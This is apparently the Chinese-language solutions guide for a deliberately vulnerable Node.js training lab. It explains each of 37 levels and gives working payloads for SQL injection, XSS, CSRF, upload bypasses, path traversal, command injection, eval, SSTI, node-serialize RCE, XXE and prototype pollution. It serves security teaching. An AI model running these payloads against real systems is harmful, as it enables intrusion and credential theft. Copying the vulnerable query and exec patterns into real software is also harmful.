# NodeSecLab 题解

本文件包含所有 37 个关卡的漏洞原理、解题思路和 Payload。

---

## 目录

- [SQL 注入（7关）](#sql-注入)
- [XSS（6关）](#xss)
- [CSRF（3关）](#csrf)
- [文件上传（6关）](#文件上传)
- [文件下载（2关）](#文件下载)
- [命令执行（5关）](#命令执行)
- [文件包含（2关）](#文件包含)
- [XML 注入（2关）](#xml-注入)
- [业务逻辑（2关）](#业务逻辑)
- [中间件漏洞（2关）](#中间件漏洞)

---

## SQL 注入

### Level 1 - 整数型注入

**漏洞原理：** 用户输入直接拼接到 SQL 语句中，没有引号包裹也没有转义。

```sql
SELECT * FROM users WHERE id = ${id}
```

**解题思路：** 直接在 `id` 参数中注入 SQL 逻辑。

**Payload：**

```
1 OR 1=1
```

```
1 UNION SELECT 1,2,3,4-- -
```

**预期结果：** 返回 `users` 表的所有数据，包括用户名和密码。

---

### Level 2 - 字符型注入

**漏洞原理：** 用户输入被包裹在单引号中，但没有转义。

```sql
SELECT * FROM users WHERE username = '${username}'
```

**解题思路：** 用单引号闭合前面的引号，注入新的 SQL 逻辑。

**Payload：**

```
' OR '1'='1
```

```
' UNION SELECT 1,2,3,4-- -
```

**预期结果：** 返回所有用户数据。

---

### Level 3 - 联合查询注入

**漏洞原理：** 查询 `articles` 表，返回 3 列（id, title, author），输入未转义。

```sql
SELECT id, title, author FROM articles WHERE author = '${author}'
```

**解题思路：** 用 UNION SELECT 查询其他表的数据，列数需匹配（3列）。

**Payload：**

```
' UNION SELECT id,username,password FROM users-- -
```

**预期结果：** 在文章列表中显示用户凭据（id、用户名、密码）。

---

### Level 4 - 布尔盲注

**漏洞原理：** 页面只显示"成功"或"失败"，不返回实际数据。

```sql
SELECT id FROM articles WHERE id = ${id}
```

**解题思路：** 通过构造条件表达式，根据页面返回的布尔值逐字符推断数据。

**Payload（判断条件真假）：**

```
10 AND 1=1    -- 返回"成功"
10 AND 1=2    -- 返回"失败"
```

**Payload（逐字符提取数据库名）：**

```
10 AND ASCII(SUBSTRING(database(),1,1))=119
```

**预期结果：** 通过布尔响应逐字符猜解出数据库名、表名、字段值。

---

### Level 5 - 时间盲注

**漏洞原理：** 页面不返回任何数据，只能通过响应时间判断。

```sql
SELECT id FROM users WHERE id = ${id}
```

**解题思路：** 用 `SLEEP()` 函数根据条件真假控制延迟时间。

**Payload（判断条件真假）：**

```
1 OR SLEEP(3)    -- 延迟3秒
```

**Payload（逐字符提取数据）：**

```
1 AND IF(ASCII(SUBSTRING(database(),1,1))=119, SLEEP(3), 0)
```

**预期结果：** 条件为真时响应延迟 3 秒，为假时立即返回。

---

### Level 6 - 二次注入

**漏洞原理：** 注册时使用参数化查询（安全），但更新资料时从数据库取出用户名直接拼接 SQL（不安全）。

```sql
-- 注册时（安全）
INSERT INTO users (username, password, email) VALUES (?, ?, ?)

-- 更新时（不安全）
UPDATE users SET email='${newEmail}' WHERE username='${username}' AND id=${id}
```

**解题思路：** 注册一个用户名包含恶意 SQL 的账户，登录后更新资料触发注入。

**步骤：**

1. 注册：用户名 `admin'-- -`，密码任意，邮箱任意
2. 登录该账户
3. 更新个人资料，填写任意新邮箱

**预期结果：** `admin` 用户的邮箱被修改，页面显示"攻击成功！你修改了管理员的邮箱地址！"

---

### Level 7 - 报错注入

**漏洞原理：** SQL 错误信息直接返回给用户，且输入未转义。

```sql
SELECT * FROM articles WHERE title LIKE '%${product}%'
```

**解题思路：** 利用 MySQL 的 `extractvalue()` 或 `updatexml()` 函数触发包含查询结果的错误信息。

**Payload：**

```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))-- -
```

**预期结果：** 错误信息中包含 `admin` 用户的密码，格式如 `XPATH syntax error: '~admin123~'`。

---

## XSS

### Level 1 - 反射型 XSS

**漏洞原理：** URL 参数 `name` 直接渲染到页面，无任何过滤。

**Payload：**

```
/xss/level1?name=<script>alert(1)</script>
```

**预期结果：** 浏览器弹出 alert 对话框。

---

### Level 2 - 存储型 XSS

**漏洞原理：** 用户提交的消息存储在内存数组中，无过滤直接渲染。

**Payload（message 字段）：**

```
<script>alert(1)</script>
```

**预期结果：** 每次访问页面或获取消息时都会执行恶意脚本。

---

### Level 3 - URL 参数 XSS

**漏洞原理：** 无输入框，`name` 参数仅通过 URL 查询字符串传入，直接渲染。

**Payload：**

```
/xss/level3?name=<img src=x onerror=alert(1)>
```

**预期结果：** JavaScript 在浏览器中执行。

---

### Level 4 - 输入框属性注入

**漏洞原理：** 服务端通过字符串拼接生成 `<input>` 标签，未转义用户输入。

```javascript
'<input type="text" value="' + input + '">'
```

**Payload：**

```
"><script>alert(1)</script>
```

```
" onfocus=alert(1) autofocus="
```

**预期结果：** 闭合 `value` 属性后注入新的 HTML 标签或事件属性。

---

### Level 5 - 过滤绕过（括号被过滤）

**漏洞原理：** 只过滤了 `(` 和 `)`，其他字符均可使用。

**Payload（使用反引号替代括号）：**

```
<script>alert`1`</script>
```

```
<img src=x onerror=alert`1`>
```

**预期结果：** 绕过括号过滤，JavaScript 正常执行。

---

### Level 6 - Style 标签注入

**漏洞原理：** 用户输入被注入到 `<style>` 标签内，过滤了 `</style>` 但可通过空格绕过。

**Payload：**

```
</style ><script>alert(1)</script>
```

**预期结果：** 提前闭合 `<style>` 标签，注入的 `<script>` 标签被执行。

---

## CSRF

### Level 1 - POST 型 CSRF（无防护）

**漏洞原理：** 邮箱修改接口没有任何 CSRF 防护措施。

**攻击方式：** 创建一个恶意 HTML 页面，自动提交表单。

```html
<form method="POST" action="http://target/csrf/level1/change-email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

**预期结果：** 用户访问恶意页面后，邮箱被修改。

---

### Level 2 - Token 验证（全局 Token）

**漏洞原理：** 有 CSRF Token 验证，但 Token 存储在全局变量中（非会话级别），可通过 XSS 或同源请求获取。

**解题思路：** 先请求页面获取 Token，再携带 Token 提交表单。

**预期结果：** 携带有效 Token 时邮箱修改成功，无 Token 时返回 403。

---

### Level 3 - GET 型 CSRF

**漏洞原理：** 邮箱修改使用 GET 请求，可通过 `<img>` 标签触发。

**Payload：**

```html
<img src="http://target/csrf/level3/change-email?email=attacker@evil.com">
```

**预期结果：** 页面加载时自动触发邮箱修改，无需用户交互。

---

## 文件上传

### Level 1 - 无任何限制

**漏洞原理：** 没有任何文件类型、扩展名、MIME 类型检查。

**解题思路：** 直接上传 webshell 文件（如 `.php`）。

**预期结果：** 文件被保存到 `/uploads/` 目录，可通过 URL 直接访问。

---

### Level 2 - 双写后缀绕过

**漏洞原理：** 使用 `path.extname()` 检查扩展名白名单（`.jpg`, `.jpeg`, `.png`, `.gif`），但 `extname` 只返回最后一个扩展名。

**Payload：** 文件名 `shell.php.jpg`，`extname` 返回 `.jpg` 通过检查。

**预期结果：** 文件上传成功。在配置不当的 Apache 服务器上，`.php` 扩展名优先生效。

---

### Level 3 - 前端 JS 验证

**漏洞原理：** 前端 JavaScript 验证文件类型，但服务端也做了同样的检查（与 Level 2 相同）。

**解题思路：** 绕过前端 JS 验证（禁用 JavaScript 或直接发请求），但服务端仍会拦截非图片文件。

---

### Level 4 - 大小写绕过

**漏洞原理：** 扩展名检查没有调用 `.toLowerCase()`，白名单全是小写。

**Payload：** 文件名 `shell.pHp` 或 `shell.PHP`，大小写混合绕过白名单匹配。

**预期结果：** 文件被接受并保存。在不区分大小写的文件系统上可执行。

---

### Level 5 - 双写后缀绕过

**漏洞原理：** 使用 `String.replace()` 只替换第一次出现的危险扩展名。

**Payload：** 文件名 `shell.php.png`，去掉第一个 `.php` 后变成 `shell..png`，`extname` 返回 `.png` 通过白名单。

**预期结果：** 文件通过过滤，原始文件名中包含 `.php`。

---

### Level 6 - Content-Type 绕过

**漏洞原理：** 只检查 `req.file.mimetype`（客户端发送的 Content-Type 头），不检查实际扩展名和文件内容。

**Payload：** 上传 `.php` 文件，但将 Content-Type 设为 `image/jpeg`。

```bash
curl -X POST http://target/upload/level6 -F "file=@shell.php;type=image/jpeg"
```

**预期结果：** 文件被当作"图片"接受，但保存为 `.php` 扩展名。

---

## 文件下载

### Level 1 - 路径遍历

**漏洞原理：** `file` 参数直接拼接到文件路径中，无任何过滤。

**Payload：**

```
/download/level1/download?file=../../etc/passwd
```

**预期结果：** 下载 `/etc/passwd` 文件内容。

---

### Level 2 - 安全实现（basename 防御）

**漏洞原理：** 使用 `path.basename()` 去除目录遍历字符，是安全的实现示例。

**Payload：**

```
/download/level2/download?file=../../etc/passwd
```

**预期结果：** `path.basename` 将路径简化为 `passwd`，文件不存在返回 404。此关卡展示正确的防御方式。

---

## 命令执行

### Level 1 - 直接命令注入

**漏洞原理：** 用户输入直接传递给 `child_process.exec()`，无任何过滤。

**Payload：**

```
whoami
```

```
cat /etc/passwd
```

```
; ls -la
```

**预期结果：** 命令输出直接显示在页面上。

---

### Level 2 - 不完整过滤

**漏洞原理：** 过滤了 `;` 和 `&`，但未过滤 `|`、反引号、`$()` 等。

**Payload：**

```
127.0.0.1 | whoami
```

```
127.0.0.1 $(cat /etc/passwd)
```

```
127.0.0.1 `whoami`
```

**预期结果：** 注入的命令输出与 ping 结果一起显示。

---

### Level 3 - eval() 代码执行

**漏洞原理：** 用户输入直接传递给 Node.js 的 `eval()` 函数。

**Payload：**

```javascript
require('child_process').execSync('whoami').toString()
```

```javascript
process.env
```

```javascript
require('fs').readFileSync('/etc/passwd', 'utf8')
```

**预期结果：** eval 执行后的返回值显示在页面上。

---

### Level 4 - 服务端模板注入（SSTI）

**漏洞原理：** 用户输入直接作为 EJS 模板字符串渲染。

**Payload：**

```
<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>
```

```
<%= process.env %>
```

**预期结果：** EJS 模板执行嵌入的代码，输出渲染到页面上。

---

### Level 5 - 反序列化漏洞

**漏洞原理：** 使用 `node-serialize` 的 `unserialize()` 方法，存在远程代码执行漏洞。

**Payload：**

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('whoami').toString()}()"}
```

**预期结果：** 反序列化触发 IIFE 执行，命令输出显示在结果中。

---

## 文件包含

### Level 1 - 本地文件包含（无过滤）

**漏洞原理：** `file` 参数直接拼接到文件路径中，无路径校验。

**Payload：**

```
/include/level1/file?file=../../etc/passwd
```

```
/include/level1/file?file=../controllers/include/level1.js
```

**预期结果：** 目标文件内容显示在页面上。

---

### Level 2 - 弱过滤绕过

**漏洞原理：** 检查并过滤了 `../` 和 `..\` 字面量，但不处理 URL 编码变体。

**Payload：**

```
/include/level2/file?file=..%2f..%2f..%2fetc/passwd
```

**预期结果：** URL 编码的遍历序列绕过字符串检查，文件内容被读取。

---

## XML 注入

### Level 1 - XXE 外部实体注入

**漏洞原理：** XML 解析器启用了外部实体加载（`replaceEntities: true`, `dtdload: true`, `noent: true`）。

**Payload：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name><role>user</role></user>
```

**预期结果：** `name` 字段的值变为 `/etc/passwd` 文件的内容。

---

### Level 2 - XPath 注入

**漏洞原理：** 用户输入直接拼接到 XPath 表达式中。

```javascript
`//user[contains(username, '${query}')]`
```

**Payload：**

```
' or '1'='1
```

**预期结果：** 查询条件被篡改，返回所有用户数据（包括 admin 账户和密码）。

---

## 业务逻辑

### Level 1 - 越权访问（IDOR）

**漏洞原理：** 通过 `id` 参数可查看任意用户信息，`/admin` 接口无需权限验证。

**Payload：**

```
GET /logic/level1/user?id=3      -- 查看其他用户信息
GET /logic/level1/admin           -- 直接访问管理后台
```

**预期结果：** 返回目标用户的个人信息或管理员设置（含 `secretKey`）。

---

### Level 2 - 重放攻击

**漏洞原理：** 交易去重检查被注释掉，同一笔交易可重复提交。

**Payload：** 重复提交同一转账请求：

```
POST /logic/level2/transfer
fromAccount=user1&toAccount=user2&amount=100&transactionId=txn123
```

**预期结果：** 每次提交都会扣款并转账，余额可被耗尽至负数。

---

## 中间件漏洞

### Level 1 - 原型污染

**漏洞原理：** JSON 解析后的对象通过递归合并到目标对象，未过滤 `__proto__` 键。

**Payload：**

```json
{"__proto__": {"isAdmin": true}}
```

**预期结果：** `Object.prototype` 被污染，页面显示"检测到原型污染！"，所有新创建的对象都具有 `isAdmin: true` 属性。

---

### Level 2 - Cookie 解析注入

**漏洞原理：** 自定义 Cookie 解析器对 JSON 格式的值执行 `JSON.parse()`，未做安全校验。

**Payload：**

```
isAdmin=true
```

**预期结果：** 页面显示"用户权限已提升为管理员！"。
